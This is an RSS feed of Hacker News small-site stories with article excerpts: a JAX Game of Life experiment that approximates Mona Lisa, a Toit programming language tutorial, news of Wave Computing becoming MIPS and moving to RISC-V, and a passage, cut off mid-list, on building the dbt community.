<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 2]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 2. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Mon, 08 Mar 2021 08:41:37 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-2.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Mon, 08 Mar 2021 08:41:37 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Finding Mona Lisa in the Game of Life - with JAX]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26365806">thread link</a>) | @atulvi
<br/>
March 5, 2021 | https://avinayak.github.io/algorithms/programming/2021/02/19/finding-mona-lisa-in-the-game-of-life.html | <a href="https://web.archive.org/web/*/https://avinayak.github.io/algorithms/programming/2021/02/19/finding-mona-lisa-in-the-game-of-life.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <video loop="" autoplay="" muted=""> <source src="https://avinayak.github.io/uploads/lisa.webm" type="video/webm"> </video>

<p>The results of this experiment are not exactly close to my target as you can see, but I thought it was worth a blog post anyway. There was this rough idea I’ve been thinking about in <a href="https://en.wikipedia.org/wiki/Conway%27s_Game_of_Life">Conway’s Game of Life</a> for a really long time.</p>

<blockquote data-conversation="none"><p lang="en" dir="ltr">I wonder if it's possible to use some kind of stochastic algorithm that gives you an initial state which forms legible text after many cycles.</p>— yakinavault (@yakinavault) <a href="https://twitter.com/yakinavault/status/1291586306489761792?ref_src=twsrc%5Etfw">August 7, 2020</a></blockquote>


<p>I came across <a href="https://kevingal.com/blog/mona-lisa-gol.html">an article</a> of the same title by Kevin Galligan recently and I thought I could do something similar using a different approach. What if instead of using SAT Solvers, I use some kind of heuristic algorithm that could somehow “program” a large world of Game of Life to display an image after a few generations?</p>

<p>There are other ways of achieving this. One is by placing still life states at specific pixels as described in this <a href="https://codegolf.stackexchange.com/questions/38573/paint-a-still-life-or-a-moving-one-draw-an-image-in-the-game-of-life">codegolf question</a>.</p>

<p>What I’m thinking of is to display Mona Lisa for a single frame/generation of ‘non-still’ Game of Life.</p>



<p>I began working on a proof of concept using the hill climbing algorithm. The idea was very simple. Iteratively modify a random 2D Game of Life state until it’s Nth generation looks similar to Mona Lisa. Here’s the full algorithm.</p>

<div><div><pre><code>    best_score := infinity
    target := mona lisa with dimensions m x n
    canvas := random matrix of m x n
    best_result := canvas
    do
        modified_canvas := Copy of canvas with a single random cell inverted
        nth_modified_canvas := Run N generations of Game of Life modified_canvas
        Compute a score of how close nth_modified_canvas is with target
        if score &lt; best_score then
        	best_score := score
            best_result := modified_canvas
        canvas := best_result
    while(max_iterations limit passed or best_score &lt; threshold)
</code></pre></div></div>

<p>I hacked up a single core prototype.</p>

<div><div><pre><code>def modify(canvas, shape):
    x,y = shape
    px = int(np.random.uniform(x+1))-1
    py = int(np.random.uniform(y+1))-1
    canvas[px][py] = not canvas[px][py]
    return canvas

def rmse(predictions,targets):
    return np.sqrt(np.mean((predictions-targets)**2))

while best_score&gt;limit:
    canvases = np.tile(np.copy(best_seed), (batch_size, 1, 1))
    rms_errors = []
    for canvas in range(len(canvases)):
        canvases[canvas] = modify(states[state], (m,n))
        rmse_val = rmse(target, nth_generation(np.copy(canvases[canvas])))
        rms_errors.append(rmse_val)
    lowest = min(rms_errors)
    if lowest &lt; best_score:
        best_score = lowest
        best_result = canvases[rms_errors.index(lowest)]
</code></pre></div></div>

<p>Hill Climbing works by finding the closest neighboring state to a current state with the least error from a ‘target_state’ (Mona Lisa). The way I find the closest neighbor in every step is to create a copy of the best solution we have so far and invert a random cell. This change is small enough that we don’t risk stepping over any local minima. Also we use root mean square error metric to compare the best state and the target. Other error metrics can be experimented with, but for this problem, I found that RMSE was sufficient.</p>

<p>After a few days of CPU time(!), I was able to obtain something that resembled Mona Lisa after running 4 generations of life.</p>

<video loop="" autoplay="" muted=""> <source src="https://avinayak.github.io/uploads/lisa_cpu.webm" type="video/mp4"> </video>

<p>It was reassuring that my algorithm did indeed work, but I realize I made a bunch of mistakes and of course it’s not really scalable for larger images or fast.</p>



<p>Target Mona Lisa against which our random state was compared with was the medium resolution version taken from Wikipedia and converted to monochrome using PIL’s <code>Image.open('target.png').convert('L')</code></p>

<p><img src="https://avinayak.github.io/uploads/screenshot-from-2021-02-23-18-38-08-copy.png" alt=""></p>

<cap><a href="https://en.wikipedia.org/wiki/Mona_Lisa#/media/File:Mona_Lisa,_by_Leonardo_da_Vinci,_from_C2RMF_retouched.jpg">Taken from wikipedia</a></cap>

<p>When you’re comparing against boolean variables, It’s better that we the target as a binary matrix rather than the whole grayscale range.</p>

<p>In this attempt, I simply rounded these grayscale values to 0s and 1s. This was a mistake as it washed away a lot of details.</p>

<p><img src="https://avinayak.github.io/uploads/screenshot-from-2021-02-23-18-39-11.png" alt=""></p>

<p>We could just not round at all and compare against the grayscale version, but there is a better way.</p>



<p>Not every random matrix of 0s and 1s are a valid Game of Life state. States that can never be an nth generation (n&gt;0) of any Cellular Automata are called Garden of Edens. It is almost impossible that our monochrome-rounded Mona Lisa is a valid Game of Life generation. We can only hope to have a solution that’s approximately close to the target.</p>

<p>This is a portion of the 4th generation of the state we just prepared.</p>

<p><img src="https://avinayak.github.io/uploads/screenshot-from-2021-02-23-19-08-47.png" alt=""></p>

<p>Judging by the texture, the way life patterns evolve and from just experimenting with images, I found that comparing against a 1-bit dithered version the target should improve the quality of results.</p>

<p><img src="https://avinayak.github.io/uploads/screenshot-from-2021-02-23-19-04-26.png" alt=""></p>

<cap>1-bit Dithering on Mona Lisa</cap>

<p>Dithered image has a somewhat even distribution of 0 and 1 cells which is somewhat close to what a randomly initialized Game of Life state will look like after a few generations. This property is also maintained when you scale up the image, (which we’ll optimize for soon).</p>

<p>We could do this using PIL (it’s <a href="https://en.wikipedia.org/wiki/Floyd%E2%80%93Steinberg_dithering">Floyd–Steinberg dithering</a>) using <code>Image.open('target.png').convert('1')</code></p>

<p><img src="https://avinayak.github.io/uploads/screenshot-from-2021-02-23-18-54-34.png" alt=""></p>

<p>Also you can see from the last result, it’s impossible to get a continuous array of white cells because they will be killed off by the overpopulation rule. Completely dark areas are stable in life. The end result will be a higher contrast, but slightly darkened version of Mona Lisa. At higher resolutions, this effect is not as apparent.</p>



<p>The single core unvectorized version is extremely slow. I tried running this in both my 8th gen Core i7 and the Google Colab CPU machines, but you need to wait for hours/days (depending on target resolution) to get something that resembles the original.</p>

<p>Fortunately, This problem is well suited for parallelization.</p>

<p><img src="https://raw.githubusercontent.com/google/jax/master/images/jax_logo_250px.png" alt=""></p>

<p>JAX is a python library that lets you use a version of numpy and compile it to highly vectorized code that can be run on a GPU/TPU. We need to rework this algorithm for a GPU.</p>

<p>GPUs generally suited to high-throughput type computations that has good data-parallelism. We need to exploit the SIMD (Single Instruction Multiple Data) architecture to gain faster execution speeds.</p>

<p>We extrude the <code>target</code>(Mona Lisa) and <code>canvas</code>(initial random state) to 3rd dimension with 3rd dimension being <code>batch_size</code> long tensor loafs (Consider a loaf of bread, with each slice being dithered Mona Lisa).</p>

<p><img src="https://avinayak.github.io/uploads/untssitled-another-copy.png" alt=""></p>

<p><img src="https://avinayak.github.io/uploads/untssitled-copy.png" alt=""></p>
<cap>Initial canvas will be completely random(unlike the figure).</cap>

<p>We set <code>best_canvas</code> to the initial random canvas before our hill climbing loop.</p>

<p>Also, for every loop iteration, we need to produce a random tensor called mutator(same shape as <code>target</code>) with this property: Each slice should have all zeros except a single one place at a random location.</p>

<p><img src="https://avinayak.github.io/uploads/untssitled-3rd-copy.png" alt=""></p>

<p>Something like</p>

<div><div><pre><code>array([[[1, 0],
        [0, 0],
        [0, 0]],

       [[1, 0],
        [0, 0],
        [0, 0]],

       [[0, 0],
        [0, 1],
        [0, 0]],

       [[0, 1],
        [0, 0],
        [0, 0]],

       [[1, 0],
        [0, 0],
        [0, 0]]])
</code></pre></div></div>

<cap><br>Example mutator with shape 5, 3, 2. batch_size being 5</cap>

<p>The idea is that in every loop, we use the mutator to calculate the nearest set of neighboring states from our best_canvas like this <code>canvas = (best_canvas + mutator)%2</code>.</p>

<p>We compute N generations of game of life across every slice of this modified canvas. Then, we do a 3D RMSE(mean being calculated for the slice only) on the Nth generation canvas against Mona Lisa, and find the slice with the lowest error.
This is slice is then extruded and set to best_canvas and the loop repeats till a finite number of iterations pass.</p>

<h2 id="code">Code</h2>

<p>The notebook for this project is <a href="https://github.com/avinayak/mona_lisa_gol_jax/blob/main/mona_lisa_overdrive.ipynb">available in github</a>. I’ll explain what every block is doing in this section. If you want to see results, skip to the end of the article.</p>

<p>The core of this project, the game of life function is actually taken from <a href="http://www.bnikolic.co.uk/blog/python/jax/2020/04/19/game-of-life-jax.html">this post</a>. Thank you  Bojan Nikolic :). I followed his convention of importing <code>jax.numpy</code> as <code>N</code>, <code>jax.lax</code> as <code>L</code>.</p>

<div><div><pre><code>%matplotlib inline 
import jax
N=jax.numpy
L=jax.lax
from jax.experimental import loops
from jax import ops
import matplotlib.pyplot as plt
import numpy as onp
import time
from PIL import Image 
from google.colab import files
</code></pre></div></div>

<p>Next, <code>wget</code> Mona Lisa</p>

<div><div><pre><code>!wget -O target.png https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Mona_Lisa%2C_by_Leonardo_da_Vinci%2C_from_C2RMF_retouched.jpg/483px-Mona_Lisa%2C_by_Leonardo_da_Vinci%2C_from_C2RMF_retouched.jpg?download
</code></pre></div></div>

<p>This is not a crazy high res version.It’s only 483px wide.</p>

<div><div><pre><code>batch_size = 100
image_file = Image.open("target.png")
image_file = image_file.convert('1')
lisa = N.array(image_file, dtype=N.int32)
width,height = lisa.shape
lisa_loaf = onp.repeat(lisa[onp.newaxis, :, :,], batch_size, axis = 0)
</code></pre></div></div>

<p>This section dithers Mona Lisa using the and extrudes it to <code>batch_size</code> length.</p>

<div><div><pre><code>key = jax.random.PRNGKey(42)
canvas_loaf = jax.random.randint(key, (batch_size, width, height), 0, 2, dtype= N.int32) #for tests, initialize random lisa
</code></pre></div></div>

<p>Here, we’re seeding JAX PRNG(will be explained soon). Also we’re creating the initial random <code>canvas_loaf</code> with integers 0 and 1.</p>

<div><div><pre><code>@jax.jit
def rgen(a):
    # This reduction over-counts the neighbours of live cells since it includes the
    # central cell itself. Subtract out the array to correct for this.
    nghbrs=L.reduce_window(a, 0, L.add, (3,3), (1,1), "SAME")-a
    birth=N.logical_and(a==0, nghbrs==3)
    underpop=N.logical_and(a==1, nghbrs&lt;2)
    overpop=N.logical_and(a==1, nghbrs&gt;3)
    death=N.logical_or(underpop, overpop)

    na=L.select(birth,
                N.ones(a.shape, N.int32),
                a)

    na=L.select(death,
                N.zeros(a.shape, N.int32),
                na)
    return na

vectorized_rgen = jax.vmap(rgen)

@jax.jit
def nv_rgen(state):
  for _ in range(n_generations):
      state = vectorized_rgen(state)
  return state
</code></pre></div></div>

<p>Please read <a href="http://www.bnikolic.co.uk/blog/python/jax/2020/04/19/game-of-life-jax.html">B. Nikolc’s post</a> for an explanation for <code>rgen</code> function, which runs a single generation of Game of Life.</p>

<p><code>jax.vmap</code> lets us creates a function which maps an input function over argument axes (vectorize). This lets us run a generation of game of life across every …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://avinayak.github.io/algorithms/programming/2021/02/19/finding-mona-lisa-in-the-game-of-life.html">https://avinayak.github.io/algorithms/programming/2021/02/19/finding-mona-lisa-in-the-game-of-life.html</a></em></p>]]>
            </description>
            <link>https://avinayak.github.io/algorithms/programming/2021/02/19/finding-mona-lisa-in-the-game-of-life.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26365806</guid>
            <pubDate>Sat, 06 Mar 2021 07:24:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Toit Programming Language]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26365202">thread link</a>) | @azhenley
<br/>
March 5, 2021 | https://docs.toit.io/language/language/ | <a href="https://web.archive.org/web/*/https://docs.toit.io/language/language/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-md-component="container">
      
        
      
      
        
      
      <main data-md-component="main">
        <div>
          
            
              
            
            
              
            
          
          <div>
            <article>
              
                
                
                  
                
                
                
<p>This quickstart guide is inspired by <a href="https://www.ruby-lang.org/en/documentation/quickstart/">Ruby in Twenty Minutes</a>. It makes the assumption that you already have <a href="https://docs.toit.io/installation/toitcli/">Toit installed</a> on your machine.</p>
<p>Toit is an object-oriented programming language for the internet of things. The Toit language has the following desirable properties:</p>
<ul>
<li>Modern, simple, and approachable</li>
<li>High-level and object-oriented</li>
<li>Declarative and statically analyzable</li>
<li>Safe and garbage collected</li>
</ul>
<p>Now, let's get started with some programming!</p>
<h2 id="hello_world">Hello, World<a href="#hello_world" title="Permanent link">#</a></h2>
<p>A local installation of Toit comes with support for running small programs directly from the command line. If you put the following code in a file called <code>hello.toit</code></p>


<p>you can run it from the command line like this:</p>
<div><pre><span></span><code>$ toit execute hello.toit
Hello World!
</code></pre></div>

<p>What just happened? The <code>toit</code> command line tool read your source code (<code>hello.toit</code>) and started running it from the <code>main</code> method that you defined. The <code>main</code> method consists of all the indented statements just below the method declaration line <code>main:</code>. Toit is indentation-based like Python, so the spaces you add to your programs are significant.</p>
<p>Once the program ran, it printed <code>Hello World!</code> in your terminal. This is because the only statement in <code>hello.toit</code> is a method call, where you invoke the <code>log</code> method with a single argument, which is the string to be logged (in this case, printed to the terminal). If you wanted to output more than one line from your program, you could update it to:</p>
<div>
<div><pre><span></span><code>main:
  log "Hello World!"
  log "Hello World!"
</code></pre></div>
</div>

<p>When you run the updated program, you will see two lines of output:</p>
<div><pre><span></span><code>$ toit execute hello.toit
Hello World!
Hello World!
</code></pre></div>

<h2 id="defining_a_method">Defining a method<a href="#defining_a_method" title="Permanent link">#</a></h2>
<p>What if you want to say "Hello" a lot without getting your fingers all tired? You should define another method:</p>


<p>and call that from <code>main</code>:</p>


<p>Calling a method in Toit is as simple as mentioning its name. If the method doesn’t take arguments that’s all you need.</p>
<p>What if we want to say hello to one person, and not the whole world? Just redefine hi to take a name as an argument.</p>
<div>
<div><pre><span></span><code>hi name:
  log "Hello $name!"
</code></pre></div>
</div>

<p>This way, <code>hi</code> is a method that takes a single argument. We can use that from <code>main</code>:</p>
<div>
<div><pre><span></span><code>main:
  hi "Lars"
  hi "Kasper"
</code></pre></div>
</div>

<p>and it works!</p>
<div><pre><span></span><code>$ toit execute hello.toit
Hello Lars!
Hello Kasper!
</code></pre></div>

<h2 id="inserting_strings_in_strings">Inserting strings in strings<a href="#inserting_strings_in_strings" title="Permanent link">#</a></h2>
<p>What’s the <code>$name</code> bit? That’s Toit's way of inserting something into a string. It is called <em>string interpolation</em>. The bit after the <code>$</code> is turned into a string (if it isn’t one already) and then substituted into the outer string at that point. You can also use this to make sure that someone’s name is properly trimmed so leading and trailing whitespace is ignored:</p>
<div>
<div><pre><span></span><code>hi name = "World":
  log "Hello, $name.trim!"
</code></pre></div>
</div>

<p>This way, we call the <code>trim</code> method on the <code>name</code> string before we insert it into the outer string. If we call <code>hi "   Lars  "</code> we still get the familiar greeting <code>Hello Lars!</code> and not <code>Hello   Lars  !</code>. You can add parentheses around the <code>name.trim</code> expression in the string to make it clearer which parts belong to the outer string:</p>
<div><pre><span></span><code>  log "Hello, $(name.trim)!"
</code></pre></div>

<p>Maybe you already spotted that we went ahead and added one other trick to the code above? We added a default value for the <code>name</code> parameter, so if the name isn’t supplied when you call <code>hi</code>, we use the default name "World". Now we can try:</p>


<p>and get the following output:</p>
<div><pre><span></span><code>$ toit execute hello.toit
Hello World!
Hello Kasper!
</code></pre></div>

<h2 id="evolving_into_a_greeter">Evolving into a greeter<a href="#evolving_into_a_greeter" title="Permanent link">#</a></h2>
<p>What if we want a real greeter around, one that remembers your name and welcomes you and treats you with respect. You might want to use an object for that. Let’s create a <code>Greeter</code> class:</p>
<div>
<div><pre><span></span><code>class Greeter:
  name := null

  constructor .name = "World":

  say_hi: log "Hi $name.trim!"

  say_bye: log "Bye $name.trim, come back soon."
</code></pre></div>
</div>

<p>The new keyword here is <code>class</code>. This defines a new class called <code>Greeter</code> and a bunch of methods for that class. Pay special attention to the method <code>constructor</code>. There is nothing after the <code>:</code> and the <code>constructor</code> method isn’t followed by any indented lines, so the constructor has no statements in it:</p>
<div><pre><span></span><code>  constructor .name = "World":
</code></pre></div>

<p>This is a constructor and it defines how you can construct objects from the class. It says the class <code>Greeter</code> takes a single argument (<code>name</code>), but the <code>.</code> prefix to the <code>.name</code> parameter actually tells us that the name is immediately stored as a field on <code>Greeter</code> objects. The field is defined just above the constructor with the <code>:=</code> syntax.</p>
<p>The field parameter <code>.name</code> still has a default value, so if we don’t pass a name, the <code>Greeter</code> will greet the world.</p>
<p>The <code>say_hi</code> and <code>say_bye</code> methods are introduced on the next two lines. The methods both have a single statement in them, so we can keep them on one line each. The <code>say_hi</code> and <code>say_bye</code> method both use the <code>name</code> field from the object they are called on. You can refer to fields in the class of a method simply by mentioning them (<code>name</code>).</p>
<h2 id="creating_a_greeter_object">Creating a greeter object<a href="#creating_a_greeter_object" title="Permanent link">#</a></h2>
<p>Now let’s create a greeter object and use it:</p>
<div>
<div><pre><span></span><code>main:
  greeter := Greeter " Helena "
  greeter.say_hi
  greeter.say_bye
</code></pre></div>
</div>

<p>We create an object simply by mentioning the constructor, <code>Greeter</code>. The greeter object remembers the name and uses it for the two separate greetings. If we run this, we get the following output:</p>
<div><pre><span></span><code>$ toit execute hello.toit
Hi Helena!
Bye Helena, come back soon.
</code></pre></div>

<p>If you want to get the name from a greeter, you can ask a greeter by calling the <code>name</code> method on it:</p>
<div>
<div><pre><span></span><code>main:
  greeter := Greeter " Helena "
  log "How are you $(greeter.name)?"
</code></pre></div>
</div>

<p>This would show <code>How are you  Helena ?</code>. Almost neat, right? Unfortunately, the name isn’t trimmed like we expected. Let’s fix that!</p>
<h2 id="fields_and_methods">Fields and methods<a href="#fields_and_methods" title="Permanent link">#</a></h2>
<p>As you have just seen, a field on an object introduces a method with the same name. If you wanted to hide a field from the outside world, you could make it private. By convention, methods and fields that end with an underscore (<code>_</code>) are private and not supposed to be touched from the outside:</p>
<div>
<div><pre><span></span><code>class Greeter:
  name_:= null
  constructor .name_ = "World":
</code></pre></div>
</div>

<p>This removes the <code>name</code> method from greeters, but if we really want to allow accessing the name from the outside, we could reintroduce a getter with the same meaning as before.</p>
<div>
<div><pre><span></span><code>class Greeter:
  name_ := null

  constructor .name_ = "World":

  name: return name_
  say_hi: log "Hi $name_.trim!"
  say_bye: log "Bye $name_.trim, come back soon."
</code></pre></div>
</div>

<p>Here we use the new keyword <code>return</code> to specify the value a method returns. We could make it slightly more interesting and trim it in the process:</p>


<p>In this way, access to the name from the outside also gets the trimming and we can avoid repeating the call to <code>trim</code>:</p>
<div>
<div><pre><span></span><code>class Greeter:
  name_ := null

  constructor .name_ = "World":

  name: return name_.trim
  say_hi: log "Hi $name!"
  say_bye: log "Bye $name, come back soon."
</code></pre></div>
</div>

<p>We can check that it works by running:</p>
<div>
<div><pre><span></span><code>main:
  greeter := Greeter " Erik "
  log "How are you $(greeter.name)?"
</code></pre></div>
</div>

<p>and you should see <code>How are you Erik?</code>. Inside <code>main</code>, we store the greeter in a local variable (<code>greeter</code>) so we can keep referring to the same object. You can think of it as a way to give a specific object a name that is only valid and useful inside the <code>main</code> method.</p>
<p>Just like introducing a member variable, we can use the <code>:=</code> syntax in methods and functions like <code>main</code> to introduce local variables.</p>
<h2 id="greetings_everyone">Greetings everyone!<a href="#greetings_everyone" title="Permanent link">#</a></h2>
<p>This greeter isn’t all that interesting though, it can only deal with one person at a time. What if we had some kind of MegaGreeter that could either greet the world, one person, or a whole list of people? Let’s try to build that. We will start with a class definition:</p>
<div>
<div><pre><span></span><code>class MegaGreeter:
  names := []

  constructor name = "World":
    names.add name
</code></pre></div>
</div>

<p>So MegaGreeter objects have a list of <code>names</code>. The <code>names</code> field is initialized to the empty list (<code>[]</code>). The body of the <code>MegaGreeter</code> constructor adds the given <code>name</code> argument to the end of the list of names. Notice that this is different than using a <code>.name</code> parameter that automatically assigns to the field called <code>name</code>. Mega greeters don't have a single name and no <code>name</code> field, so here the <code>name</code> is just an ordinary parameter that we can use in the body of the constructor. All in all, this code:</p>
<div>
<div><pre><span></span><code>main:
  greeter := MegaGreeter
  log "The names are $greeter.names"
</code></pre></div>
</div>

<p>will lead to this output:</p>
<div><pre><span></span><code>$ toit execute hello.toit
The names are ["World"]
</code></pre></div>

<p>We can now go ahead and add greeter methods that show all the names:</p>
<div>
<div><pre><span></span><code>// Greeter that says hi to everybody.
class MegaGreeter:
  names := []

  constructor name = "World":
    names.add name

  say_hi:
    // Greet everyone individually!
    names.do: log "Hello $it!"
  say_bye:
    everyone := names.join ", "
    log "Bye $everyone, come back soon."

main:
  greeter := MegaGreeter
  greeter.say_hi
  greeter.say_bye

  greeter.names.add "Lars"
  greeter.names.add "Kasper"
  greeter.names.add "Rikke"
  greeter.say_hi
  greeter.say_bye
</code></pre></div>
</div>

<p>If you run this, you’ll get this output:</p>
<div><pre><span></span><code>$ toit execute hello.toit
Hello World!
Bye World, come back soon.
Hello World!
Hello Lars!
Hello Kasper!
Hello Rikke!
Bye World, Lars, Kasper, Rikke, come back soon.
</code></pre></div>

<p>Let’s dive into the new constructs in the next sections.</p>

<p>Not everything in your source files is meant to be run by the Toit compiler. Sometimes, it is nice just to add comments that explain interesting things related to your code. In the example in the last section, there were a few single line comments:</p>
<div>
<div><pre><span></span><code>// Greeter that says hi to everybody.
class MegaGreeter:
</code></pre></div>
</div>

<p>Such comments start with <code>//</code> and tell the system to ignore the rest of the line.</p>
<p>You have already seen the use of indentation to give hierarchical structure to your code. The general structure is that after a <code>:</code> you can have a single construct if it fits on one line:</p>


<p>or you can add a newline after the <code>:</code> and let the following lines that are indented relative to the outer construct …</p></article></div></div></main></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://docs.toit.io/language/language/">https://docs.toit.io/language/language/</a></em></p>]]>
            </description>
            <link>https://docs.toit.io/language/language/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26365202</guid>
            <pubDate>Sat, 06 Mar 2021 04:27:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Wave Computing Rebrands to MIPS, Embraces RISC-V for Next-Gen Cores]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26364117">thread link</a>) | @brucehoult
<br/>
March 5, 2021 | https://abopen.com/news/wave-computing-rebrands-to-mips-risc-v/ | <a href="https://web.archive.org/web/*/https://abopen.com/news/wave-computing-rebrands-to-mips-risc-v/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><b>Wave Computing has emerged from bankruptcy proceedings with the surprise news that it’s taking the name of its MIPS subsidiary and moving to the free and open-source RISC-V ISA for future processor IP.<br>
</b></p>
<p>Wave Computing <a href="https://abopen.com/news/wave-computing-announces-mips-open-initiative/">dipped its toes in the free and open-source silicon movement back in 2018</a>, announcing that its subsidiary MIPS Tech, acquired from Imagination Technologies in June that year, would provide 32- and 64-bit versions of the MIPS instruction set architecture (ISA) and full licences to its MIPS-related patent portfolio free of licensing fees and royalty payments. “We invite the worldwide community to join us in this exciting journey,” MIPS IP president Art Swift said at the time, “and look forward to seeing the many MIPS-based innovations that result.”</p>
<p>In March 2019 <a href="https://abopen.com/news/wave-computing-announces-first-mips-open-release/">the first MIPS Open IP hit the market</a>, but seven months later <a href="https://abopen.com/news/wave-computing-shutters-mips-open-programme-with-immediate-effect/">the MIPS Open initiative shuttered with immediate effect</a>. The decision seemed inexplicable – until Wave Computing filed for Chapter 11 bankruptcy protection in April last year, unveiling financial troubles.</p>
<p>Now, that process is complete – and Wave Computing is back, but under a new name: Wave Computing is now MIPS, and is to push forward with a focus on its processor IP. That focus, interestingly, includes a move away from its in-house MIPS ISA for future designs: instead, the company’s eighth-generation cores will be based on the free and open-source RISC-V architecture with which Wave Computing’s MIPS Open had hoped to compete.</p>
<p>The reborn MIPS has not yet indicated whether it plans to release its eighth-generation IP under open terms or to keep it proprietary.</p>

        </div></div>]]>
            </description>
            <link>https://abopen.com/news/wave-computing-rebrands-to-mips-risc-v/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26364117</guid>
            <pubDate>Sat, 06 Mar 2021 00:40:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Build a Community: Starting with “Why?”]]>
            </title>
            <description>
<![CDATA[
Score 46 | Comments 18 (<a href="https://news.ycombinator.com/item?id=26363709">thread link</a>) | @alexdean
<br/>
March 5, 2021 | https://clrcrl.com/2021/03/03/how-to-build-a-community-why.html | <a href="https://web.archive.org/web/*/https://clrcrl.com/2021/03/03/how-to-build-a-community-why.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <h2 id="my-origin-story">My origin story</h2>

<p>In November 2018, I moved from Sydney to the US to take on a role managing the dbt community. I’d been a member of the community for the two years prior, and in that time had gone from a data analyst who knew enough SQL to be dangerous, to someone who understood the data space deeply enough that I wanted a new challenge. And I’d learned almost everything about data from the dbt community.</p>

<p>Over the last few years, the dbt community has been incredibly successful — since I started, we’ve grown from 1000 members to over 10 000. In December, we hosted a conference that had 5 000 registrants, and received incredibly positive feedback. Late last year, when our eventual Series-B investors reached out to a dozen community members and asked for their NPS, we received an average score of 10.2/10 — no, this is not a typo, apparently someone gave us as 12/10. (If this was you: you should know better as a data person! You’re really messing up my numbers here!). Most of these community members cited the community as a reason for their high score.</p>

<p>Finally, around once a week I get around one DM a week saying thanks for everything we’ve built!</p>

<p><img src="https://clrcrl.com/assets/img/posts/tickled-pink.png"></p>



<p>If you had asked me when I joined in November 2018 what our community would look like at 10k members, I would have guessed that it would have become like most other online communities: full of unkind people and extractive behavior (after all, <a href="http://blog.vickiboykis.com/2017/05/10/good-things-don't-scale/">good things don’t scale</a>). I would have been scared of that day.</p>

<p>Yet somehow, despite my worst fears of growth (or perhaps because of them), people still find being a part of the dbt community to be a net-positive experience. Sure, it’s not perfect, but it’s still pretty good!</p>

<p>As a result, other companies in the industry are noticing, leading to a number of “can I pick your brain?” meeting requests¹ over the past few months. Most days, I feel wholly unqualified to give an opinion on why, or how, we’ve been so successful, I’ve just been making it up as I go along. But when I look at what we’ve achieved, when I talk to new starters at our company, or when I <em>do</em> let someone pick my brain, I realise that I do know <em>something</em> about this whole community building thing, and perhaps that thing is worth writing about.</p>

<p>So, this is the first of who-knows-how-many posts on <em>How to Build a Community</em>.</p>



<p>Often folks end up in my inbox because their CEO has heard that community building is the latest hotness, and they’re scrambling to figure out what that means, and how they should do this.</p>

<p>My first question is always “why do you want to build a community?”. Here’s some common answers:</p>
<ul>
  <li>“Well, it must be fantastic at increasing your top of funnel for sales and marketing.”</li>
  <li>“It just feels like your community creates incredible hype around your product.”</li>
  <li>“I guess we’ll be able to understand our users’ needs better, and get more product feedback.”</li>
  <li>“After all, you get free content, and get to outsource a ton of other work.”</li>
</ul>

<p>These are pretty reasonable answers on the surface, especially if you’re looking at our community as a model of success — after all, we do in fact get all of these benefits.</p>

<p>But if these are the primary motivators for <em>why</em> you’re building a community, I’m skeptical that you’ll succeed. These reasons put the benefit of the company ahead of the community member, and I’m pretty sure that any of our community members would see right through these motivations.</p>

<h2 id="building-mission-driven-communities">Building mission-driven communities</h2>

<p>So if those answers aren’t quite right, what <em>is</em> a good answer? Here’s my two step process to identifying why community might be right for you:</p>

<ol>
  <li>Find for your company mission, and</li>
  <li>Ask yourself “does building a community help us achieve this mission?”. If yes, then that’s your “why”.</li>
</ol>

<p>Let’s take the mission of company I work for, Fishtown Analytics, as an example:</p>
<blockquote>
  <p>Fishtown Analytics is on a mission to empower analysts.</p>
</blockquote>

<p>(OK there’s actually a little bit more in the mission, but this is the part that I like most).</p>

<p>Another great example is <a href="https://www.animalz.co/about/">Animalz</a>:</p>
<blockquote>
  <p><strong>Set a new bar for quality content marketing</strong>. <br> We envision a world where the internet is dominated by content that’s informative, insightful and entertaining.</p>
</blockquote>

<p>In both of these examples, it’s so clear that community is a tool for the company to achieve this mission — yes, a company can provide software and services in pursuit of this mission, but to <em>really</em> achieve it, one needs to be thinking bigger than this.</p>

<h2 id="how-does-this-play-out">How does this play out?</h2>

<p>For the last two and a half years, I’ve approached community-management from the perspective of trying to achieve our mission of empowering more analysts. Often, this leads us to make decisions that look different to other companies in our space.</p>

<ul>
  <li>On creating events:
    <ul>
      <li><strong>Other companies:</strong> I recently saw the info sheet for an event that a vendor wanted us to participate in. At the top of the sheet was the goal for the event: “Create $X of sales opportunities”. Most of the talks were a thinly-veiled sales pitch for their product. I didn’t feel like I’d learned anything by attending, and I won’t be attending next year.</li>
      <li><strong>My take:</strong> When planning our inaugural conference, Coalesce, our goal was to create an event that advanced the practice of analytics engineering. When selecting talks, we chose the ones that we felt helped data teams be more impactful.</li>
